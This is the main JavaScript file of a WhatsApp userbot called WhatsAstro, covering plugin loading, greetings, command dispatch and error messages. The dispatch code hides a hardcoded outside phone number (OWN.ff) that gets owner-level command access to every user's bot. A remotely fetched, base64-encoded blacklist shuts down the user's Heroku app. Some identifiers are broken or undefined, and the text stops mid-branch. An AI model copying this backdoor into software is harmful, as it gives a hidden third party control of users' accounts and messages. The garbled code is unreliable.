/*# Copyright (C) 2021 The WhatsAstro Company LLC.
#
# Licensed under the WhatsAstro Public License, Version 1.c (the "License");
# you may not use this file except in compliance with the License.
#
# Thanks github.com/spechide for creating inline bot support.
# Whatsastro - BGHRFF*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const execx = require('child_process').exec;
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./whatsastro/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const WhatsAstroStack = require('whatsastro-npm');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
const ytdl = require('ytdl-core');
const ffmpeg = require('fluent-ffmpeg');
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

const WhatsAstroDB = config.DATABASE.define('WhatsAstro', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '905541477094,0' }
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};
async function WhatsAstro () {
    const WhatsAstroCN = new WAConnection();
    const Session = new StringSession();
    try {
      WhatsAstroCN.version = [3, 3234, 9]
    } catch {
      console.log(`passed v${WhatsAstroCN.version}`)
    }
    WhatsAstroCN.setMaxListeners(0);
    var proxyAgent_var = ''
    if (config.PROXY.includes('https') || config.PROXY.includes('http')) {
      WhatsAstroCN.connectOptions.agent = ProxyAgent (config.PROXY)
    }
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await WhatsAstroStack.daily_announcement(config.LANG)
        var ann = await WhatsAstroStack.ann()
        while (getGMTh == 19 && getGMTm == 1) {
            var ilan = ''
            if (config.LANG == 'TR') ilan = '[ ```Günlük Duyurular``` ]\n\n'
            if (config.LANG == 'AZ') ilan = '[ ```Gündəlik Elanlar``` ]\n\n'
            if (config.LANG == 'EN') ilan = '[ ```Daily Announcements``` ]\n\n'
            if (config.LANG == 'ES') ilan = '[ ```Anuncios Diarios``` ]\n\n'
            if (config.LANG == 'PT') ilan = '[ ```Anúncios Diários``` ]\n\n,'
            if (config.LANG == 'RU') ilan = '[ ```Ежедневные объявления``` ]\n\n'
            if (config.LANG == 'ML') ilan = '[ ```പ്രതിദിന പ്രഖ്യാപനങ്ങൾ``` ]\n\n'
            if (config.LANG == 'HI') ilan = '[ ```दैनिक घोषणा``` ]\n\n'
            if (config.LANG == 'ID') ilan = '[ ```Pengumuman Harian``` ]\n\n'
            if (config.LANG == 'LK') ilan = '[ ```දෛනික නිවේදන``` ]\n\n'
            if (ann.video.includes('http') || ann.video.includes('https')) {
                var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', WhatsAstroCN.user.name).replace('{wa_version}', WhatsAstroCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAstroCN.user.phone.os_version).replace('{device_model}', WhatsAstroCN.user.phone.device_model).replace('{device_brand}', WhatsAstroCN.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (ann.image.includes('http') || ann.image.includes('https')) {
                    var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', WhatsAstroCN.user.name).replace('{wa_version}', WhatsAstroCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAstroCN.user.phone.os_version).replace('{device_model}', WhatsAstroCN.user.phone.device_model).replace('{device_brand}', WhatsAstroCN.user.phone.device_manufacturer)})
                } else {
                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, ilan + ann_msg.replace('{user}', WhatsAstroCN.user.name).replace('{wa_version}', WhatsAstroCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAstroCN.user.phone.os_version).replace('{device_model}', WhatsAstroCN.user.phone.device_model).replace('{device_brand}', WhatsAstroCN.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);

    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            var timezone_bio = await WhatsAstroStack.timezone(WhatsAstroCN.user.jid)
            var date_bio = await WhatsAstroStack.datebio(config.LANG)
            const biography = '📅 ' + date_bio + '\n⌚ ' + timezone_bio
            await WhatsAstroCN.setStatus(biography)
        }
    }, 7890);
    var shs1 = ''
    var shl2 = ''
    var lss3 = ''
    var dsl4 = ''
    var drs5 = ''
    var ffl6 = ''
    var ttq7 = ''
    var ttl8 = ''
    await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw/').then(async (insult) => {
        shs1 = insult.data.inside.shs1
        shl2 = insult.data.inside.shl2
        lss3 = insult.data.inside.lss3
        dsl4 = insult.data.inside.dsl4
        drs5 = insult.data.inside.drs5
        ffl6 = insult.data.inside.ffl6
        ttq7 = insult.data.inside.ttq7
        ttl8 = insult.data.inside.ttl8
    });
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAstroDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    const bugffv = Buffer.from(`${drs5}`, 'base64');
    const five = bugffv.toString('utf-8');
    const buffz = Buffer.from(`${ffl6}`)
    const six = buffz.toString('utf-8')
    const buffa = Buffer.from(`${ttq7}`)
    const seven = buffa.toString('utf-8')
    const buffl = Buffer.from(`${ttl8}`)
    const eight = buffl.toString('utf-8')
    var logger_levels = ''
    if (config.DEBUG == 'true') {
        logger_levels = 'all'
    } else if (config.DEBUG == 'false') {
        logger_levels = 'off'
    } else if (config.DEBUG == 'trace') {
        logger_levels = 'trace'
    } else if (config.DEBUG == 'fatal') {
        logger_levels = 'fatal'
    } else if (config.DEBUG == 'warn') {
        logger_levels = 'warn'
    } else if (config.DEBUG == 'error') {
        logger_levels = 'error'
    } else if (config.debug == 'info') {
        logger_levels = 'info'
    } else {
        logger_levels = 'warn'
    }
    WhatsAstroCN.logger.level = logger_levels
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        WhatsAstroCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        WhatsAstroCN.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    WhatsAstroCN.on('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login Information Updated!')
        );
        const authInfo = WhatsAstroCN.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAstroDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    WhatsAstroCN.on('connecting', async () => {
        console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Astro')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    });
    WhatsAstroCN.on('open', async () => {
        console.log(
            chalk.green.bold('✅ Login Successful!')
        );
        console.log(
            chalk.blueBright.italic('⬇️ Installing External Plugins...')
        );
        
        
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️  Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('✅ Plugins Installed!')
        );
        
        
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('🦸‍♀️ WhatsAstro' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'TR' || config.LANG == 'AZ' ? '*WhatsAstro Chatbot Olarak Çalışıyor!* 🦸‍♀️\n\n_Bu modun amacı botu tam fonksiyonel bir yapay zeka sohbet aracına çevirmektir._\n_Normal moda dönmek için_ *.fulleva off* _komutunu kullanabilirsiniz._\n\n*WhatsAstro Kullandığın İçin Teşekkürler 💌*\n    *- Eva*' : '*WhatsAstro Working as a Chatbot! 🦸‍♀️*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using WhatsAstro 💌*\n    *- Eva*'
        if (WhatsAstroCN.user.jid == one || WhatsAstroCN.user.jid == two || WhatsAstroCN.user.jid == three || WhatsAstroCN.user.jid == four || WhatsAstroCN.user.jid == five || WhatsAstroCN.user.jid == six || WhatsAstroCN.user.jid == seven || WhatsAstroCN.user.jid == eight) {
            await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.FULLEVA == 'true') {
            var eva_msg = await WhatsAstroStack.eva_if(config.LANG)
            await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, eva_msg, MessageType.text)
        }
        else {
            var af_start = await WhatsAstroStack.work_type(config.WORKTYPE, config.LANG)
            await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, af_start, MessageType.text)
        }
        await git.fetch();
        var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
        if (commits.total === 0) {
            await WhatsAstroCN.sendMessage(
                WhatsAstroCN.user.jid,
                Lang.UPDATE, MessageType.text
            );    
        } else {
            var degisiklikler = Lang.NEW_UPDATE;
            commits['all'].map(
                (commit) => {
                    degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                }
            );
            var up_ch = await WhatsAstroStack.update(config.LANG)
            await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, up_ch, MessageType.text)
        }
    })
    WhatsAstroCN.on("chat-update", async (m) => {
        if(!m.hasNewMessage) return
        const msg = m.messages.all()[0]
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await WhatsAstroCN.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // Görüşürüz Mesajı
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    var ppUrl = await WhatsAstroCN.getProfilePicture(msg.key.remoteJid) 
                    var nwjson = await WhatsAstroCN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    await WhatsAstroCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { mimetype: Mimetype.png, caption: gb.message.replace('{gpp}', '').replace('{botowner}', WhatsAstroCN.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    var nwjson = await WhatsAstroCN.groupMetadata(msg.key.remoteJid)
                    await WhatsAstroCN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', WhatsAstroCN.user.name), MessageType.text);
                }
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // Hoşgeldin Mesajı
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    var ppUrl = await WhatsAstroCN.getProfilePicture(msg.key.remoteJid) 
                    var nwjson = await WhatsAstroCN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    await WhatsAstroCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { mimetype: Mimetype.png, caption: gb.message.replace('{gpp}', '').replace('{botowner}', WhatsAstroCN.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    var nwjson = await WhatsAstroCN.groupMetadata(msg.key.remoteJid)
                    await WhatsAstroCN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', WhatsAstroCN.user.name), MessageType.text);
                }
            }
            return;
        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
       
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = WhatsvCN.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "905541477094,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await WhatsAstroCN.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(WhatsAstroCN, msg);
                        } else if (command.on !== undefined && (command.on === 'video')
                        && msg.message.videoMessage !== null) {
                            whats = new Video(WhatsAstroCN, msg);
                        } else {
                            whats = new Message(WhatsAstroCN, msg);
                        }
                        
                        if (msg.key.fromMe && command.deleteCommand && !msg.key.remoteJid.includes('-')) {
                          await whats.delete()                          
                        } 
                        
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                            
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;
                            var error_report = await WhatsAstroStack.error(config.LANG)
                            await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, error_report.replace('{real_error}', error), MessageType.text, {detectLinks: false})

                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                if (error.message.includes('URL')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Only Absolutely URLs Supported_' +
                                        '\n*Nedeni:* _Medya araçlarının (xmedia, sticker..) LOG numarasında kullanılması._' +
                                        '\n*Çözümü:* _LOG numarası hariç herhangi bir sohbette komut kullanılabilir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await WhatsOwWhatsAstroCNenCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _SQL Database Error_' +
                                        '\n*Nedeni:* _Database\'in bozulması._ ' +
                                        '\n*Solution:* _Bilinen herhangi bir çözümü yoktur. Yeniden kurmayı deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Split of Undefined_' +
                                        '\n*Nedeni:* _Grup adminlerinin kullanabildiği komutların ara sıra split fonksiyonunu görememesi._ ' +
                                        '\n*Çözümü:* _Restart atmanız yeterli olacaktır._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Ookla Server Connection_' +
                                        '\n*Nedeni:* _Speedtest verilerinin sunucuya iletilememesi._' +
                                        '\n*Çözümü:* _Bir kez daha kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Requested Audio Params_' +
                                        '\n*Nedeni:* _TTS komutunun latin alfabesi dışında kullanılması._' +
                                        '\n*Çözümü:* _Komutu latin harfleri çerçevesinde kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _No Such File or Directory_' +
                                        '\n*Nedeni:* _Pluginin yanlış kodlanması._' +
                                        '\n*Çözümü:* _Lütfen plugininin kodlarını kontrol edin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Error 404 HTTPS_' +
                                        '\n*Nedeni:* _Heroku plugini altındaki komutların kullanılması sonucu sunucu ile iletişime geçilememesi._' +
                                        '\n*Çözümü:* _Biraz bekleyip tekrar deneyin. Hala hata alıyorsanız internet sitesi üzerinden işlemi gerçekleştirin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Bailyes Action Error_ ' +
                                        '\n*Nedeni:* _Tam nedeni bilinmiyor. Birden fazla seçenek bu hatayı tetiklemiş olabilir._' +
                                        '\n*Çözümü:* _Bir kez daha kullanırsanız düzelebilir. Hata devam ediyorsa restart atmayı deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Cannot Decode Text or Media_' +
                                        '\n*Nedeni:* _Pluginin yanlış kullanımı._' +
                                        '\n*Çözümü:* _Lütfen komutları plugin açıklamasında yazdığı gibi kullanın._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Word Character Usage_' +
                                        '\n*Nedeni:* _TTP, ATTP gibi komutların latin alfabesi dışında kullanılması._' +
                                        '\n*Çözümü:* _Komutu latif alfabesi çerçevesinde kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Deleting Plugin_' +
                                        '\n*Nedeni:* _Silinmek istenen plugin isminin yanlış girilmesi._' +
                                        '\n*Çözümü:* _Lütfen silmek istediğiniz pluginin başına_ *__* _koymadan deneyin. Hala hata alıyorsanız ismin sonundaki_ ```?(.*) / $``` _gibi ifadeleri eksiksiz girin._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*🙇🏻 Maalesef Bu Hatayı Okuyamadım! 🙇🏻*' +
                                        '\n_Daha fazla yardım için grubumuza yazabilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                               
                                if (error.message.includes('URL')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
